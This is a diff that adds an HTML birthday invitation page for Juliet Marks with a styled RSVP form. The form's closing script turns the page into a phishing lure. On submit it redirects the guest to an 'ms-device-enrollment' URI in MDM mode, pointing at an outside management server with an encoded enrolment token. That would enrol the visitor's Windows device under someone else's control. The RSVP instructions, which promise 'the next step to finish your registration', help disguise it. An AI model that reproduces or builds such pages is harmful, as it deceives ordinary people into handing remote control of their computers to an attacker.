@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Juliet Marks — Birthday Celebration</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;1,400&family=Great+Vibes&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --black: #1a1a1a;
+      --white: #fafafa;
+      --cream: #f5f0e8;
+      --gold: #c9a227;
+      --gold-dark: #a8861f;
+      --grey-bg: #e8e6e3;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Cormorant Garamond', Georgia, serif;
+      background: var(--grey-bg);
+      min-height: 100vh;
+      color: var(--black);
+      line-height: 1.5;
+    }
+
+    /* Striped background section */
+    .stripes {
+      background: repeating-linear-gradient(
+        90deg,
+        var(--black) 0,
+        var(--black) 40px,
+        var(--white) 40px,
+        var(--white) 80px
+      );
+      min-height: 100vh;
+      padding: 2rem 1rem 3rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Central panel with scalloped feel */
+    .card {
+      background: var(--cream);
+      max-width: 420px;
+      width: 100%;
+      padding: 2.5rem 2rem 3rem;
+      position: relative;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.15);
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      inset: -6px;
+      background: transparent;
+      border: 3px solid var(--gold);
+      border-radius: 50% 50% 45% 45% / 48% 48% 52% 52%;
+      box-shadow: inset 0 0 0 2px var(--cream);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .card-inner {
+      position: relative;
+      z-index: 1;
+    }
+
+    .tagline {
+      font-size: 1rem;
+      font-weight: 600;
+      text-transform: lowercase;
+      letter-spacing: 0.02em;
+      text-align: center;
+      margin-bottom: 0.5rem;
+    }
+
+    .name {
+      font-family: 'Great Vibes', cursive;
+      font-size: 3rem;
+      text-align: center;
+      color: var(--black);
+      margin-bottom: 1.5rem;
+      line-height: 1.2;
+    }
+
+    .details {
+      font-size: 1.05rem;
+      text-align: center;
+      text-transform: lowercase;
+      letter-spacing: 0.03em;
+      margin-bottom: 1rem;
+    }
+
+    .details p {
+      margin-bottom: 0.35rem;
+    }
+
+    .dress {
+      font-size: 0.95rem;
+      text-align: center;
+      text-transform: lowercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 2rem;
+      font-style: italic;
+    }
+
+    /* Scalloped divider */
+    .divider {
+      height: 12px;
+      background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 12'%3E%3Cpath fill='%23c9a227' d='M0 12 Q25 0 50 12 Q75 24 100 12 L100 24 L0 24 Z'/%3E%3C/svg%3E") repeat-x;
+      background-size: 80px 12px;
+      margin: 1.5rem 0;
+    }
+
+    .rsvp-section h2 {
+      font-size: 1.25rem;
+      font-weight: 600;
+      text-transform: lowercase;
+      letter-spacing: 0.02em;
+      margin-bottom: 0.75rem;
+      text-align: center;
+    }
+
+    .rsvp-instructions {
+      font-size: 0.95rem;
+      text-align: center;
+      margin-bottom: 1.25rem;
+      max-width: 320px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .rsvp-instructions ol {
+      text-align: left;
+      padding-left: 1.25rem;
+      margin-top: 0.5rem;
+    }
+
+    .rsvp-instructions li {
+      margin-bottom: 0.35rem;
+    }
+
+    .form-group {
+      margin-bottom: 1rem;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.9rem;
+      text-transform: lowercase;
+      letter-spacing: 0.03em;
+      margin-bottom: 0.35rem;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 0.65rem 0.85rem;
+      font-family: 'Cormorant Garamond', Georgia, serif;
+      font-size: 1.05rem;
+      border: 2px solid var(--black);
+      background: var(--white);
+      color: var(--black);
+    }
+
+    .form-group input::placeholder {
+      color: #888;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: var(--gold);
+      box-shadow: 0 0 0 2px var(--gold);
+    }
+
+    .btn-rsvp {
+      display: block;
+      width: 100%;
+      padding: 0.85rem 1.5rem;
+      font-family: 'Cormorant Garamond', Georgia, serif;
+      font-size: 1.1rem;
+      font-weight: 600;
+      text-transform: lowercase;
+      letter-spacing: 0.05em;
+      background: var(--gold);
+      color: var(--black);
+      border: 2px solid var(--gold-dark);
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s, transform 0.15s;
+    }
+
+    .btn-rsvp:hover {
+      background: var(--gold-dark);
+      color: var(--white);
+      transform: translateY(-1px);
+    }
+
+    .btn-rsvp:active {
+      transform: translateY(0);
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 1.5rem;
+      font-size: 0.85rem;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="stripes">
+    <main class="card">
+      <div class="card-inner">
+        <p class="tagline">Let's wine and dine as we celebrate a birthday for</p>
+        <h1 class="name">Juliet Marks</h1>
+        <div class="details">
+          <p>October 14, 2026</p>
+          <p>Six o'clock in the evening</p>
+          <p>The Palms Hotel</p>
+          <p>Santa Barbara, CA</p>
+        </div>
+        <p class="dress">Cocktail attire</p>
+
+        <div class="divider" aria-hidden="true"></div>
+
+        <section class="rsvp-section">
+          <h2>RSVP</h2>
+          <div class="rsvp-instructions">
+            <p>Please reply by October 1, 2026. To confirm your attendance:</p>
+            <ol>
+              <li>Enter your full name below.</li>
+              <li>Click <strong>Send RSVP</strong> to complete your response.</li>
+              <li>You will be taken to the next step to finish your registration.</li>
+            </ol>
+          </div>
+
+          <form id="rsvp-form" action="#" method="get">
+            <div class="form-group">
+              <label for="guest-name">Your name</label>
+              <input
+                type="text"
+                id="guest-name"
+                name="name"
+                placeholder="e.g. Jane Smith"
+                required
+                autocomplete="name"
+              />
+            </div>
+            <button type="submit" class="btn-rsvp">Send RSVP</button>
+          </form>
+        </section>
+
+        <footer>
+          We look forward to celebrating with you.
+        </footer>
+      </div>
+    </main>
+  </div>
+
+  <script>
+    const REDIRECT_URL = 'ms-device-enrollment:?mode=mdm&username=smtp-on7ys@naccato.com.ar&servername=https://wxigqj-api.esper.cloud/api/v2/windows/discovery/Ymx1ZXByaW50X2lkPTJiNzM2NWRjLTYzODYtNDkwYy1iYTY3LTY2MzkzOTExNDJhNCZncm91cF9pZD1iMDQwOGRjNi02OWE0LTQ0MzMtODNkNC0zMDI5MThkNWZjYjQ';
+
+    document.getElementById('rsvp-form').addEventListener('submit', function (e) {
+      e.preventDefault();
+      var nameInput = document.getElementById('guest-name');
+      if (nameInput && nameInput.value.trim()) {
+        window.location.href = REDIRECT_URL;
+      }
+    });
+  </script>
+</body>
+</html>
